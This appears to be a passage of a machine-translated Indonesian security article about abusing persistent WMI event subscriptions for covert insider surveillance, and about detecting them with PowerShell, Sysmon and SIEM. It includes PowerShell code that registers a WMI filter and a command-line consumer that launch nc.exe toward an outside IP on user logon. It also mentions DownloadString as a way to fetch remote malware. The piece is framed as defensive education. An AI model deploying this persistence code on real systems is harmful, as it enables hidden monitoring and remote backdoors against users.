<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
sayangnya. Sayangnya, pada tahap ini, asumsi saya bahwa insider cerdas, tapi tidak terlalu berpengalaman dengan mudah bisa menggunakan peristiwa sementara WMI untuk surveilans rahasia mulai berantakan.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Mengapa peristiwa konstan harus digunakan untuk observasi? </font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Yang benar dan pada saat yang sama membutuhkan lebih banyak pengetahuan mendalam adalah dengan menggunakan acara WMI persisten. Peristiwa WMI permanen, meskipun memiliki beberapa kompleksitas, bukan hanya alat yang lebih efektif untuk mata-mata orang dalam daripada peristiwa sementara, tetapi mereka juga memungkinkan Anda untuk lebih efektif memantau ancaman internal. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mempelajari peristiwa persisten akan membutuhkan waktu, tetapi mereka mewakili cara yang paling efektif untuk menerapkan sistem pemantauan yang ketat untuk sistem besar. Mereka memiliki kemampuan lebih dari acara WMI sementara. Mereka juga dapat digunakan untuk memperingatkan Anda tentang aktivitas jahat yang tidak standar, seperti penerowongan DNS atau pelanggaran kebijakan </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Zero Trust.</font></font></a><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Saya menghabiskan beberapa hari mempelajari peristiwa yang persisten dan menemukan bahwa PowerShell memiliki cmdlet khusus yang menyederhanakan proses pembuatan filter peristiwa, konsumen, dan objek WMI antara filter dan konsumen. Seperti yang kita semua tahu, PowerShell memberi administrator banyak peluang untuk menyederhanakan pekerjaan mereka. Sayangnya, contoh ini menunjukkan bagaimana penyerang dapat memanfaatkan fitur hebat ini. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Orang dalam menciptakan peristiwa konstan pada sistem target, sehingga membebaskan dirinya dari kebutuhan untuk hadir dalam sesi shell. Acara tetap ada selamanya atau sampai dihapus secara eksplisit. Anda dapat membaca lebih lanjut tentang cara melakukan ini di </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sini.</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tetapi secara keseluruhan prosesnya mirip dengan apa yang saya lakukan di atas dengan acara sementara. </font><font style="vertical-align: inherit;">Hal terakhir yang dibutuhkan oleh peretas kami adalah mengaitkan filter peristiwa dengan konsumen acara. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Saya setuju bahwa untuk karyawan biasa yang tiba-tiba memutuskan untuk menjadi peretas jahat, ini terlihat terlalu keren. </font><font style="vertical-align: inherit;">Demi minat, saya membaca berbagai </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">forum</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> dan melihat bahwa banyak orang gagal berjuang untuk mendapatkan WMI acara konstan untuk bekerja. </font><font style="vertical-align: inherit;">Namun, ini tidak melampaui kemampuan "Snowden" kami dan administrator sistem cerdas lainnya yang memutuskan untuk beralih ke sisi gelap.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Acara Konstan: Kiat untuk Admin IT</font></font></font></h2><br>
<img src="https://habrastorage.org/webt/8c/gh/rn/8cghrnfq5mao1zm9d5-95y2kdys.jpeg"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Metode ini tidak dimaksudkan untuk melatih peretas potensial atau karyawan yang tersinggung yang ingin membalas dendam pada majikan. </font><font style="vertical-align: inherit;">Yang ingin saya lakukan adalah membantu para profesional TI memahami pola pikir peretas sehingga mereka dapat menerapkan perlindungan yang tepat terhadap serangan penetrasi. </font><font style="vertical-align: inherit;">Bagi mereka, saya menunjukkan cara mengkonfigurasi objek konsumen dan filter menggunakan </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmdlet Set-WmiInstance</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> :</font></font><br>
<br>
<pre><code class="plaintext hljs">$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{<font></font>
<font></font>
EventNamespace = 'root/cimv2'<font></font>
Name = “cruella”<font></font>
Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser'"<font></font>
QueryLanguage = 'WQL'<font></font>
}<font></font>
<font></font>
<font></font>
$command = "powershell.exe -Command {$names = gwmi Win32_Process; $users=@(); foreach ($n in $names) {$users += $n.GetOwner().User}; foreach ($u in $users) {if ($u -eq 'cruella') { C:\users\lex\Documents\nc.exe 172.31.45.240 10000}}}"<font></font>
<font></font>
<font></font>
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{<font></font>
Name = "Consumer"<font></font>
CommandLineTemplate = $Command<font></font>
<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pekerjaan rumah Anda adalah membuat kode PowerShell yang menghubungkan kedua komponen ini bersama-sama. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dalam tes saya sendiri, saya bisa mendapatkan acara permanen untuk bekerja pada sistem target tanpa usaha dan penderitaan yang berlebihan. </font><font style="vertical-align: inherit;">Seingat Anda, ini sangat sulit dicapai dengan acara WMI sementara yang berlangsung selama sesi PowerShell.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dengan menyiapkan acara WMI yang persisten, misalnya, untuk memantau login pengguna, orang dalam atau peretas tidak diharuskan untuk tetap berada di sistem target. Bonus tambahan adalah bahwa acara WMI persisten kuat: ketika komputer dinyalakan kembali, pemicu acara masih berfungsi. Hal ini membuat WMI kejadian persisten cara yang kuat dan rahasia untuk memicu serangan, yang dapat melibatkan lebih dari sekedar pemantauan. Seingat Anda, peristiwa WMI jauh dari tempat pertama di mana spesialis keamanan akan mencari sumber serangan. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Misalnya, kode PowerShell untuk konsumen acara dapat bertindak sebagai peluncur dan mengunduh malware yang disimpan di server jarak jauh menggunakan </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DownloadString</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . besar </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">presentasi</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Matt Graber di konferensi Black Hat berisi banyak informasi tentang potensi berbahaya dari peristiwa WMI yang persisten. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jika Anda seorang spesialis keamanan, bagaimana Anda akan bekerja dengan peristiwa WMI dalam hal potensi penggunaan berbahaya mereka? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Semoga berhasil di pihak Anda: menggunakan cmdlet Get-WmiObject (alias gwmi), Anda dapat membuat daftar filter acara, konsumen, dan objek yang mengikat:</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/ug/ql/gd/ugqlgdjx1alwtunb4oczheoxh3k.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Anda daftar peristiwa persisten WMI menggunakan Get-WMIObject dan mengatur parameter yang sesuai. </font><font style="vertical-align: inherit;">Perhatikan kurangnya cap waktu. </font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sekarang, jika mereka menemukan filter (atau konsumen) dari peristiwa permanen yang mencurigakan, profesional TI dapat mematikannya dengan menghapusnya menggunakan pipa PowerShell dan </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmdlet WMI-RemoveObject</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> :</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/uo/t-/lj/uot-ljlw9zzi_jw5xosdyeaikwa.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Menghapus peristiwa WMI yang persisten melibatkan penggunaan pipa PowerShell. </font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Perhatikan bahwa waktu peristiwa itu dibuat maupun nama pengguna jahat ditentukan di sini. </font><font style="vertical-align: inherit;">Untuk mendapatkan informasi forensik ini, Anda harus berkonsultasi dengan log peristiwa Windows. </font><font style="vertical-align: inherit;">Lebih lanjut tentang ini di bawah ini.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bisakah saya menonaktifkan acara WMI yang persisten?</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Paling tidak, profesional TI dapat dengan cepat melihat rekaman peristiwa persisten WMI dan mulai menganalisis skenario kehidupan nyata untuk tanda-tanda ancaman. Mungkin, sebagai spesialis keamanan TI yang berpengalaman, Anda berpikir bahwa tidak semua orang membutuhkan WMI di laptop dan strategi terbaik untuk menangani kerentanan peristiwa persisten WMI adalah menonaktifkan WMI sepenuhnya. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Anda dapat mencoba menonaktifkan layanan </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Winmgmt</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , yang memulai WMI. Dalam praktiknya, ini tidak sesederhana itu. Dalam pengujian saya sendiri, saya tidak dapat menonaktifkan layanan ini: secara otomatis mulai lagi dan lagi. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Misalkan Anda masih berhasil menonaktifkannya. Perangkat lunak administrasi Windows sangat bergantung pada WMI dan tidak akan berfungsi jika Winmgmt tidak tersedia. </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;">Forum di</font></a><font style="vertical-align: inherit;"> seluruh internet</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">diisi dengan pesan peringatan terhadap penonaktifan WMI. </font><font style="vertical-align: inherit;">Saya menyarankan Anda untuk mendengarkan dan mengampuni WMI Anda.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Identifikasi ancaman peristiwa WMI dengan Sysmon dan SIEM</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Secara umum, Anda harus menerima kerentanan acara WMI sebagai fakta. Untungnya, ada cara yang lebih efisien untuk mendeteksi peristiwa persisten dan operasi peristiwa mencurigakan lainnya di Windows daripada menggunakan cmdlet Powershell yang disebutkan di atas. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Temui Sysmon! Saya tidak akan masuk ke perincian tentang utilitas Windows gratis ini, yang dapat diunduh </font><font style="vertical-align: inherit;">di </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sini</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> di artikel ini. Saya hanya dapat mengatakan bahwa ini memungkinkan Anda untuk mendapatkan informasi yang sangat berguna untuk analisis di satu tempat, daripada melihat setiap log peristiwa Windows secara terpisah. Pengguna Windows 7 dan yang lebih baru mungkin tidak memerlukan Sysmon, karena sistem Windows yang lebih baru menggunakan mekanisme logging standar yang lebih maju.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/tv/-l/_2/tv-l_2ztyvfhhag1nf3faxi5qji.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Sysmon adalah alat pencatatan peristiwa yang mudah dan intuitif dari Microsoft. </font></font><br>
 <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sysmon menetapkan pengidentifikasi peristiwa 19 untuk pembuatan acara filter WMI permanen (20 ditugaskan untuk membuat acara konsumen WMI, dan 21 ditugaskan untuk pengikatan WMI). Jika Anda membuka penampil acara, Anda akan menemukan log peristiwa Sysmon di bagian Microsoft -&gt; Windows -&gt; Sysmon. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Anda tidak ingin membuka penampil acara secara manual untuk memantau acara WMI yang persisten, yang dapat menjadi tanda aktivitas peretas. Kami tahu bagaimana membantu Anda. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mengapa tidak membuat filter peristiwa persisten WMI untuk memantau kreasi (tebakan?) Tentang peristiwa persisten WMI? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Di </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">github</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ada proyek kecil di mana Anda akan menemukan kode untuk mengkonfigurasi operasi ini. </font><font style="vertical-align: inherit;">Berikut ini adalah cuplikan kode untuk filter acara WMI yang memungkinkan Anda untuk melacak pembuatan ... ya, filter acara WMI:</font></font><br>
<br>
<pre><code class="plaintext hljs">$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{<font></font>
EventNamespace = 'root/subscription'<font></font>
Name = '_PersistenceEvent_'<font></font>
Query = 'SELECT * FROM __InstanceCreationEvent WITHIN 5 Where TargetInstance ISA "__EventConsumer"'<font></font>
<font></font>
QueryLanguage = 'WQL'<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jelas, di sini kita membutuhkan bantuan keamanan informasi dan alat manajemen peristiwa keamanan (SIEM), karena bukti terkubur di puing-puing majalah. </font><font style="vertical-align: inherit;">Saya pikir Anda mengerti di mana semuanya berjalan. </font><font style="vertical-align: inherit;">Anda akan membutuhkan </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">solusi pemantauan keamanan</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> yang menggabungkan fitur SIEM dengan analisis ancaman lain untuk mendeteksi dan menghilangkan ancaman yang terkait dengan peristiwa WMI yang persisten.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Instrumentasi Manajemen Windows Pertanyaan yang Sering Diajukan</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Metode yang dijelaskan di atas dapat digunakan untuk menerapkan sistem pengawasan di jaringan Anda, namun, Anda mungkin memiliki beberapa pertanyaan tentang WMI. </font><font style="vertical-align: inherit;">Di bagian ini, kami akan menjawab yang paling umum.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Apakah WMI tidak digunakan lagi?</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
WMI sendiri tidak ketinggalan zaman, tetapi WMIC telah ditinggalkan, yang membingungkan banyak orang. </font><font style="vertical-align: inherit;">PowerShell sekarang digunakan untuk mengakses fungsi-fungsi yang sebelumnya disediakan oleh WMIC.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Port apa yang digunakan WMI? </font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
WMI menggunakan port TCP 135 dan sejumlah port dinamis: 49152-65535 (port RPC dinamis: Windows Vista, 2008 dan lebih tinggi), TCP 1024-65535 (port RPC dinamis: Windows NT4, Windows 2000, Windows 2003). </font><font style="vertical-align: inherit;">Anda juga dapat mengonfigurasi rentang port khusus untuk WMI.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Apakah WMI menggunakan WimRM? </font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Konfigurasi ini tidak standar, tetapi Anda dapat menggunakan WMI untuk mengambil data menggunakan skrip atau aplikasi menggunakan WinRM Scripting API, atau menggunakan alat baris perintah Winrm. </font><font style="vertical-align: inherit;">WinRM dapat menggunakan WMI untuk mengumpulkan data sumber daya atau untuk mengelola sumber daya di sistem operasi Windows.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kesimpulan</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Seperti yang telah kita lihat, WMI menyediakan administrator dengan alat yang kuat untuk memantau proses jarak jauh dan komputer dan dapat digunakan dalam mengembangkan perjanjian pemantauan pengguna akhir (EUMA) untuk secara otomatis memperingatkan aktivitas mencurigakan. </font><font style="vertical-align: inherit;">Ini menjadikannya alat yang hebat untuk mendeteksi dan menghilangkan ancaman internal, mencegah upaya untuk menghindari kebijakan keamanan, serta memantau bagaimana sistem Anda digunakan. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jika Anda ingin mempelajari lebih lanjut tentang cara menggunakan WMI untuk memantau aktivitas orang dalam, Anda dapat mengunduh panduan terperinci kami di </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sini</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id507048/index.html">Olya, tes dan pabrik - jalan menuju arsitektur yang indah dan kode bersih</a></li>
<li><a href="../id507050/index.html">Analisis desain game Hollow Knight. Bagian 1. Persimpangan yang Terlupakan</a></li>
<li><a href="../id507052/index.html">Data Scientist paling keren tidak membuang waktu untuk statistik</a></li>
<li><a href="../id507058/index.html">Joel Spolsky: Peran Gamifikasi dalam Keberhasilan Stack Overflow</a></li>
<li><a href="../id507066/index.html">10 Cara untuk Mengotomatiskan Iklan di Google Ads</a></li>
<li><a href="../id507074/index.html">Lembar cheat SIMD, sekarang untuk .NET Core</a></li>
<li><a href="../id507078/index.html">Pengadilan memerintahkan media untuk menghapus artikel orang lain, dan menerbitkan sanggahan pada Yandex utama</a></li>
<li><a href="../id507080/index.html">Semua Piala: Kisah Desain Ekosistem Hebat</a></li>
<li><a href="../id507084/index.html">Pihak SpatialChat menjadi populer selama pandemi - dan mereka tidak mungkin berakhir setelah teluk</a></li>
<li><a href="../id507086/index.html">Ubah skrip Bash ke kode C # untuk mengirim SMS melalui modem usb HUAWEI E3372</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>